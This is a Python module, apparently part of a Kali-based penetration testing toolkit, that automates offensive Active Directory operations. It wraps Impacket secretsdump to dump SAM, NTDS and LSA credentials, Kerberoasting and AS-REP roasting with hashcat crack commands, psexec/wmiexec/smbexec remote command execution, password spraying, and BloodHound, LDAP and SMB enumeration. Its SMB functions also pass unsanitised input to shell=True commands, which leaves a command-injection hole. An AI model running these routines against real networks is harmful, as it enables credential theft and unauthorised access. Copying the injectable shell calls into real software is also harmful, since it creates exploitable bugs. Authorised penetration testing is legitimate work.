#!/usr/bin/env python3
"""
Active Directory Tools Module
- BloodHound data collection
- Impacket wrappers (secretsdump, psexec, wmiexec, smbexec)
- Kerberoasting / AS-REP Roasting
- LDAP enumeration
- SMB enumeration
- Password spraying
"""

import os
import re
import json
import glob
import shutil
import subprocess
import logging
import socket
import struct
from datetime import datetime
from typing import Dict, Any, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger(__name__)


class ADTools:
    """Active Directory penetration testing toolkit"""

    def __init__(self, output_dir: str = "/opt/zebbern-kali/ad_tools"):
        self.output_dir = output_dir
        self._ensure_dirs()

        # Tool paths — resolve dynamically, fall back to well-known locations
        self.impacket_path = self._find_impacket_path()
        self.bloodhound_path = shutil.which("bloodhound-python") or "/usr/bin/bloodhound-python"
        self.netexec_path = shutil.which("netexec") or shutil.which("nxc") or shutil.which("crackmapexec") or "/usr/bin/netexec"
        self.ldapsearch_path = shutil.which("ldapsearch") or "/usr/bin/ldapsearch"

        # Check available tools
        self.available_tools = self._check_tools()

    def _ensure_dirs(self):
        """Ensure output directories exist."""
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "bloodhound"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "secretsdump"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "kerberoast"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "ldap"), exist_ok=True)
        os.makedirs(os.path.join(self.output_dir, "smb"), exist_ok=True)

    def _find_impacket_path(self) -> str:
        """Locate the impacket examples/scripts directory dynamically."""
        # Check if impacket scripts are directly on PATH (pip install)
        sd = shutil.which("secretsdump.py")
        if sd:
            return os.path.dirname(sd)
        # Check pip site-packages locations
        candidates = (
            glob.glob("/usr/local/lib/python3*/dist-packages/impacket/examples") +
            glob.glob("/usr/lib/python3*/site-packages/impacket/examples") +
            glob.glob("/usr/local/lib/python3*/site-packages/impacket/examples")
        )
        if candidates:
            return candidates[0]
        # Fallback to APT path
        return "/usr/share/doc/python3-impacket/examples"

    def _check_tools(self) -> Dict[str, bool]:
        """Check which tools are available."""
        tools = {}

        # Check impacket scripts
        impacket_scripts = [
            "secretsdump.py", "GetUserSPNs.py", "GetNPUsers.py",
            "psexec.py", "wmiexec.py", "smbexec.py", "dcomexec.py"
        ]
        for script in impacket_scripts:
            name = script.replace('.py', '')
            # Check on PATH first (pip-installed), then in impacket_path dir
            tools[name] = bool(shutil.which(script)) or os.path.exists(
                os.path.join(self.impacket_path, script)
            )

        # Check other tools
        tools["bloodhound-python"] = bool(shutil.which("bloodhound-python")) or os.path.exists(self.bloodhound_path)
        tools["crackmapexec"] = bool(shutil.which("crackmapexec")) or bool(shutil.which("netexec")) or bool(shutil.which("nxc")) or os.path.exists(self.netexec_path)
        tools["ldapsearch"] = bool(shutil.which("ldapsearch")) or os.path.exists(self.ldapsearch_path)
        tools["kerbrute"] = self._check_command("kerbrute")
        tools["responder"] = self._check_command("responder")

        # Additional AD tools
        tools["bloodyad"] = bool(shutil.which("bloodyad"))
        tools["certipy"] = bool(shutil.which("certipy"))
        tools["pywhisker"] = bool(shutil.which("pywhisker"))
        tools["coercer"] = bool(shutil.which("coercer"))
        tools["krbrelayx"] = bool(shutil.which("krbrelayx.py")) or bool(shutil.which("krbrelayx"))
        tools["netexec"] = bool(shutil.which("netexec")) or bool(shutil.which("nxc"))
        tools["ldapdomaindump"] = bool(shutil.which("ldapdomaindump"))

        logger.info(f"AD Tools available: {[k for k,v in tools.items() if v]}")
        return tools

    def _check_command(self, cmd: str) -> bool:
        """Check if command exists."""
        try:
            subprocess.run(["which", cmd], capture_output=True, check=True)
            return True
        except:
            return False

    def _run_impacket(self, script: str, args: List[str],
                      timeout: int = 300) -> Dict[str, Any]:
        """Run an impacket script."""
        script_path = os.path.join(self.impacket_path, f"{script}.py")

        if not os.path.exists(script_path):
            return {"success": False, "error": f"{script} not found"}

        try:
            cmd = ["python3", script_path] + args
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=timeout
            )

            return {
                "success": result.returncode == 0,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "command": " ".join(cmd)
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Command timed out"}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # ==================== BloodHound Collection ====================

    def bloodhound_collect(self, domain: str, username: str, password: str,
                           dc_ip: str, collection_method: str = "all",
                           use_ldaps: bool = False, nameserver: str = "") -> Dict[str, Any]:
        """
        Collect BloodHound data from Active Directory.

        Args:
            domain: Target domain
            username: Domain username
            password: Password
            dc_ip: Domain Controller IP
            collection_method: Collection method (all, group, localadmin, session, trusts, etc.)
            use_ldaps: Use LDAPS (port 636)

        Returns:
            Collection results and output file paths
        """
        try:
            output_dir = os.path.join(
                self.output_dir, "bloodhound",
                f"{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            )
            os.makedirs(output_dir, exist_ok=True)

            cmd = [
                "bloodhound-python",
                "-u", username,
                "-p", password,
                "-d", domain,
                "-ns", nameserver if nameserver else dc_ip,
                "-c", collection_method,
                "--zip",
                "-o", output_dir
            ]

            if use_ldaps:
                cmd.append("--ssl")

            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=600
            )

            # Find output files
            output_files = []
            for f in os.listdir(output_dir):
                output_files.append(os.path.join(output_dir, f))

            return {
                "success": result.returncode == 0,
                "domain": domain,
                "collection_method": collection_method,
                "output_dir": output_dir,
                "output_files": output_files,
                "stdout": result.stdout,
                "stderr": result.stderr if result.returncode != 0 else None,
                "timestamp": datetime.now().isoformat()
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Collection timed out after 10 minutes"}
        except Exception as e:
            logger.error(f"BloodHound collection error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== Secretsdump ====================

    def secretsdump(self, target: str, username: str = "", password: str = "",
                    domain: str = "", hashes: str = "",
                    just_dc: bool = False) -> Dict[str, Any]:
        """
        Dump secrets from a remote machine using secretsdump.

        Args:
            target: Target IP or hostname
            username: Username
            password: Password (or use hashes)
            domain: Domain name
            hashes: NTLM hashes (LM:NT format)
            just_dc: Only dump NTDS.dit (DC only)

        Returns:
            Dumped credentials and hashes
        """
        try:
            # Build target string
            if domain:
                target_str = f"{domain}/{username}"
            else:
                target_str = username

            if password:
                target_str += f":{password}@{target}"
            elif hashes:
                target_str += f"@{target}"
            else:
                target_str = f"@{target}"

            args = [target_str]

            if hashes:
                args.extend(["-hashes", hashes])

            if just_dc:
                args.append("-just-dc")

            result = self._run_impacket("secretsdump", args, timeout=600)

            if result.get("success"):
                # Parse output for credentials
                output = result.get("stdout", "")

                sam_hashes = []
                ntds_hashes = []
                cached_creds = []
                lsa_secrets = []

                current_section = None

                for line in output.split('\n'):
                    line = line.strip()

                    if "[*] Dumping local SAM hashes" in line:
                        current_section = "sam"
                    elif "[*] Dumping Domain Credentials" in line:
                        current_section = "ntds"
                    elif "[*] Dumping cached domain logon" in line:
                        current_section = "cached"
                    elif "[*] Dumping LSA Secrets" in line:
                        current_section = "lsa"
                    elif ":::" in line:
                        if current_section == "sam":
                            sam_hashes.append(line)
                        elif current_section == "ntds":
                            ntds_hashes.append(line)
                    elif current_section == "cached" and line and not line.startswith("["):
                        cached_creds.append(line)
                    elif current_section == "lsa" and line and not line.startswith("["):
                        lsa_secrets.append(line)

                # Save to file
                output_file = os.path.join(
                    self.output_dir, "secretsdump",
                    f"secretsdump_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                )
                with open(output_file, 'w') as f:
                    f.write(output)

                return {
                    "success": True,
                    "target": target,
                    "sam_hashes": sam_hashes,
                    "ntds_hashes": ntds_hashes[:100],  # Limit output
                    "ntds_total": len(ntds_hashes),
                    "cached_credentials": cached_creds,
                    "lsa_secrets": lsa_secrets[:20],
                    "output_file": output_file,
                    "timestamp": datetime.now().isoformat()
                }
            else:
                return result

        except Exception as e:
            logger.error(f"Secretsdump error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== Kerberoasting ====================

    def kerberoast(self, domain: str, username: str, password: str,
                   dc_ip: str, output_format: str = "hashcat",
                   target_user: str = "") -> Dict[str, Any]:
        """
        Perform Kerberoasting attack to get service account TGS tickets.

        Args:
            domain: Target domain
            username: Domain username
            password: Password
            dc_ip: Domain Controller IP
            output_format: Output format (hashcat or john)

        Returns:
            Service Principal Names and crackable hashes
        """
        try:
            target_str = f"{domain}/{username}:{password}@{dc_ip}"

            args = [target_str, "-request"]

            if target_user:
                args.extend(["-target-user", target_user])

            if output_format == "hashcat":
                args.append("-outputfile")
                output_file = os.path.join(
                    self.output_dir, "kerberoast",
                    f"kerberoast_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                )
                args.append(output_file)

            result = self._run_impacket("GetUserSPNs", args)

            if result.get("success"):
                output = result.get("stdout", "")

                # Parse SPNs
                spns = []
                hashes = []

                for line in output.split('\n'):
                    if "$krb5tgs$" in line:
                        hashes.append(line.strip())
                    elif "/" in line and "@" in line:
                        # Looks like an SPN entry
                        parts = line.split()
                        if len(parts) >= 2:
                            spns.append({
                                "user": parts[0] if parts else "",
                                "spn": parts[1] if len(parts) > 1 else ""
                            })

                return {
                    "success": True,
                    "domain": domain,
                    "spns_found": len(spns),
                    "hashes_obtained": len(hashes),
                    "spns": spns,
                    "hashes": hashes[:10],  # Limit for display
                    "output_file": output_file if output_format == "hashcat" else None,
                    "crack_command": f"hashcat -m 13100 {output_file} wordlist.txt" if hashes else None,
                    "timestamp": datetime.now().isoformat()
                }
            else:
                return result

        except Exception as e:
            logger.error(f"Kerberoasting error: {e}")
            return {"success": False, "error": str(e)}

    def asreproast(self, domain: str, dc_ip: str, userlist: str = "",
                   username: str = "", password: str = "") -> Dict[str, Any]:
        """
        Perform AS-REP Roasting to get hashes for accounts without pre-auth.

        Args:
            domain: Target domain
            dc_ip: Domain Controller IP
            userlist: Path to user list file
            username: Optional authenticated username
            password: Optional password

        Returns:
            Vulnerable users and crackable hashes
        """
        try:
            if username and password:
                target_str = f"{domain}/{username}:{password}@{dc_ip}"
            else:
                target_str = f"{domain}/@{dc_ip}"

            args = [target_str, "-request"]

            if userlist and os.path.exists(userlist):
                args.extend(["-usersfile", userlist])

            output_file = os.path.join(
                self.output_dir, "kerberoast",
                f"asreproast_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            )
            args.extend(["-outputfile", output_file])

            result = self._run_impacket("GetNPUsers", args)

            if result.get("success") or "hash" in result.get("stdout", "").lower():
                output = result.get("stdout", "")

                hashes = []
                vulnerable_users = []

                for line in output.split('\n'):
                    if "$krb5asrep$" in line:
                        hashes.append(line.strip())
                        # Extract username from hash
                        match = re.search(r'\$krb5asrep\$\d+\$([^@]+)@', line)
                        if match:
                            vulnerable_users.append(match.group(1))

                return {
                    "success": True,
                    "domain": domain,
                    "vulnerable_users": vulnerable_users,
                    "hashes_obtained": len(hashes),
                    "hashes": hashes[:10],
                    "output_file": output_file if hashes else None,
                    "crack_command": f"hashcat -m 18200 {output_file} wordlist.txt" if hashes else None,
                    "timestamp": datetime.now().isoformat()
                }
            else:
                return result

        except Exception as e:
            logger.error(f"AS-REP Roasting error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== Remote Execution ====================

    def psexec(self, target: str, username: str, password: str = "",
               domain: str = "", hashes: str = "",
               command: str = "cmd.exe") -> Dict[str, Any]:
        """
        Execute commands via PsExec-style (SMB + service creation).

        Args:
            target: Target IP
            username: Username
            password: Password
            domain: Domain
            hashes: NTLM hashes
            command: Command to execute

        Returns:
            Command output
        """
        return self._remote_exec("psexec", target, username, password,
                                domain, hashes, command)

    def wmiexec(self, target: str, username: str, password: str = "",
                domain: str = "", hashes: str = "",
                command: str = "whoami") -> Dict[str, Any]:
        """
        Execute commands via WMI.

        Args:
            target: Target IP
            username: Username
            password: Password
            domain: Domain
            hashes: NTLM hashes
            command: Command to execute

        Returns:
            Command output
        """
        return self._remote_exec("wmiexec", target, username, password,
                                domain, hashes, command)

    def smbexec(self, target: str, username: str, password: str = "",
                domain: str = "", hashes: str = "",
                command: str = "whoami") -> Dict[str, Any]:
        """
        Execute commands via SMB (uses service creation).
        """
        return self._remote_exec("smbexec", target, username, password,
                                domain, hashes, command)

    def _remote_exec(self, method: str, target: str, username: str,
                     password: str, domain: str, hashes: str,
                     command: str) -> Dict[str, Any]:
        """Generic remote execution wrapper."""
        try:
            if domain:
                target_str = f"{domain}/{username}"
            else:
                target_str = username

            if password:
                target_str += f":{password}@{target}"
            elif hashes:
                target_str += f"@{target}"
            else:
                return {"success": False, "error": "Password or hashes required"}

            args = [target_str]

            if hashes:
                args.extend(["-hashes", hashes])

            # For single command execution
            if command and command not in ["cmd.exe", "powershell.exe"]:
                args.extend(["-c", command])

            result = self._run_impacket(method, args, timeout=120)

            return {
                "success": result.get("success", False),
                "method": method,
                "target": target,
                "command": command,
                "output": result.get("stdout", ""),
                "error": result.get("stderr", "") if not result.get("success") else None,
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            logger.error(f"{method} error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== LDAP Enumeration ====================

    def ldap_enum(self, dc_ip: str, domain: str, username: str = "",
                  password: str = "", anonymous: bool = True,
                  query: str = "") -> Dict[str, Any]:
        """
        Enumerate LDAP for users, groups, and computers.

        Args:
            dc_ip: Domain Controller IP
            domain: Domain name
            username: Optional username for authenticated bind
            password: Optional password
            anonymous: Allow anonymous bind
            query: Custom LDAP query

        Returns:
            LDAP enumeration results
        """
        try:
            # Build base DN from domain
            base_dn = ",".join([f"DC={part}" for part in domain.split(".")])

            results = {
                "success": True,
                "domain": domain,
                "base_dn": base_dn,
                "queries": {}
            }

            # Default queries
            queries = {
                "users": "(objectClass=user)",
                "computers": "(objectClass=computer)",
                "groups": "(objectClass=group)",
                "domain_admins": "(&(objectClass=group)(cn=Domain Admins))",
                "spn_accounts": "(servicePrincipalName=*)",
                "unconstrained_delegation": "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
                "asreproastable": "(userAccountControl:1.2.840.113556.1.4.803:=4194304)",
            }

            if query:
                queries["custom"] = query

            for query_name, ldap_filter in queries.items():
                cmd = [
                    "ldapsearch", "-x",
                    "-H", f"ldap://{dc_ip}",
                    "-b", base_dn,
                    ldap_filter
                ]

                if username and password:
                    cmd.extend(["-D", f"{username}@{domain}", "-w", password])

                try:
                    result = subprocess.run(
                        cmd, capture_output=True, text=True, timeout=60
                    )

                    # Parse LDAP output
                    entries = []
                    current_entry = {}

                    for line in result.stdout.split('\n'):
                        if line.startswith("dn: "):
                            if current_entry:
                                entries.append(current_entry)
                            current_entry = {"dn": line[4:]}
                        elif ": " in line and current_entry:
                            key, value = line.split(": ", 1)
                            current_entry[key] = value

                    if current_entry:
                        entries.append(current_entry)

                    results["queries"][query_name] = {
                        "filter": ldap_filter,
                        "count": len(entries),
                        "entries": entries[:50]  # Limit results
                    }

                except Exception as e:
                    results["queries"][query_name] = {"error": str(e)}

            # Save results
            output_file = os.path.join(
                self.output_dir, "ldap",
                f"ldap_enum_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            )
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)

            results["output_file"] = output_file
            results["timestamp"] = datetime.now().isoformat()

            return results

        except Exception as e:
            logger.error(f"LDAP enumeration error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== Password Spraying ====================

    def password_spray(self, target: str, userlist: str, password: str,
                       domain: str = "", protocol: str = "smb",
                       delay: float = 0.5) -> Dict[str, Any]:
        """
        Perform password spraying attack.

        Args:
            target: Target IP or hostname
            userlist: Path to file containing usernames
            password: Password to spray
            domain: Domain name
            protocol: Protocol (smb, ldap, winrm)
            delay: Delay between attempts

        Returns:
            Valid credentials found
        """
        try:
            if not os.path.exists(userlist):
                return {"success": False, "error": f"User list not found: {userlist}"}

            with open(userlist, 'r') as f:
                users = [line.strip() for line in f if line.strip()]

            valid_creds = []
            tested = 0

            # Use netexec/crackmapexec if available
            if self.available_tools.get("crackmapexec") or self.available_tools.get("netexec"):
                nxc_bin = shutil.which("netexec") or shutil.which("nxc") or shutil.which("crackmapexec") or "netexec"
                cmd = [
                    nxc_bin, protocol,
                    target,
                    "-u", userlist,
                    "-p", password,
                    "--continue-on-success"
                ]

                if domain:
                    cmd.extend(["-d", domain])

                try:
                    result = subprocess.run(
                        cmd, capture_output=True, text=True, timeout=len(users) * 5
                    )

                    # Parse output for successful logins
                    for line in result.stdout.split('\n'):
                        if "[+]" in line or "Pwn3d" in line:
                            valid_creds.append({
                                "line": line.strip(),
                                "success": True
                            })

                    return {
                        "success": True,
                        "target": target,
                        "protocol": protocol,
                        "users_tested": len(users),
                        "password": password,
                        "valid_credentials": valid_creds,
                        "output": result.stdout,
                        "timestamp": datetime.now().isoformat()
                    }

                except Exception as e:
                    logger.warning(f"CrackMapExec failed: {e}, falling back to manual")

            # Fallback to manual testing (SMB only)
            import socket

            for user in users:
                tested += 1

                # Simple SMB auth check using smbclient
                try:
                    if domain:
                        user_str = f"{domain}\\{user}"
                    else:
                        user_str = user

                    cmd = [
                        "smbclient", "-L", target,
                        "-U", f"{user_str}%{password}",
                        "-c", "exit"
                    ]

                    result = subprocess.run(
                        cmd, capture_output=True, text=True, timeout=10
                    )

                    if result.returncode == 0 or "Sharename" in result.stdout:
                        valid_creds.append({
                            "username": user,
                            "password": password,
                            "domain": domain
                        })

                except:
                    pass

                if delay > 0:
                    import time
                    time.sleep(delay)

            return {
                "success": True,
                "target": target,
                "users_tested": tested,
                "password": password,
                "valid_credentials": valid_creds,
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            logger.error(f"Password spray error: {e}")
            return {"success": False, "error": str(e)}

    # ==================== SMB Enumeration ====================

    def smb_enum(self, target: str, username: str = "", password: str = "",
                 domain: str = "", hashes: str = "") -> Dict[str, Any]:
        """
        Enumerate SMB shares and permissions.

        Args:
            target: Target IP
            username: Username
            password: Password
            domain: Domain
            hashes: NTLM hashes

        Returns:
            SMB shares and access information
        """
        try:
            results = {
                "success": True,
                "target": target,
                "shares": [],
                "null_session": False
            }

            # Build auth string
            if username and password:
                auth = f"-U '{domain}\\{username}%{password}'" if domain else f"-U '{username}%{password}'"
            elif hashes:
                auth = f"--pw-nt-hash -U '{username}%{hashes.split(':')[1]}'"
            else:
                auth = "-N"  # Null session
                results["null_session"] = True

            # List shares
            cmd = f"smbclient -L //{target} {auth}"

            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True, timeout=30
                )

                for line in result.stdout.split('\n'):
                    # Parse share lines
                    if 'Disk' in line or 'IPC' in line or 'Print' in line:
                        parts = line.split()
                        if parts:
                            share_name = parts[0]
                            share_type = parts[1] if len(parts) > 1 else "Unknown"

                            # Test access
                            access = self._test_share_access(
                                target, share_name, username, password, domain
                            )

                            results["shares"].append({
                                "name": share_name,
                                "type": share_type,
                                "read": access.get("read", False),
                                "write": access.get("write", False)
                            })

            except Exception as e:
                results["error"] = str(e)

            # Save results
            output_file = os.path.join(
                self.output_dir, "smb",
                f"smb_enum_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            )
            with open(output_file, 'w') as f:
                json.dump(results, f, indent=2)

            results["output_file"] = output_file
            results["timestamp"] = datetime.now().isoformat()

            return results

        except Exception as e:
            logger.error(f"SMB enumeration error: {e}")
            return {"success": False, "error": str(e)}

    def _test_share_access(self, target: str, share: str,
                           username: str, password: str, domain: str) -> Dict:
        """Test read/write access to a share."""
        access = {"read": False, "write": False}

        try:
            if username and password:
                auth = f"-U '{domain}\\{username}%{password}'" if domain else f"-U '{username}%{password}'"
            else:
                auth = "-N"

            # Test read
            cmd = f"smbclient //{target}/{share} {auth} -c 'ls' 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                access["read"] = True

            # Test write (try to create a test file)
            # Skipping write test to avoid modifying target

        except:
            pass

        return access


# Create singleton instance
ad_tools = ADTools()
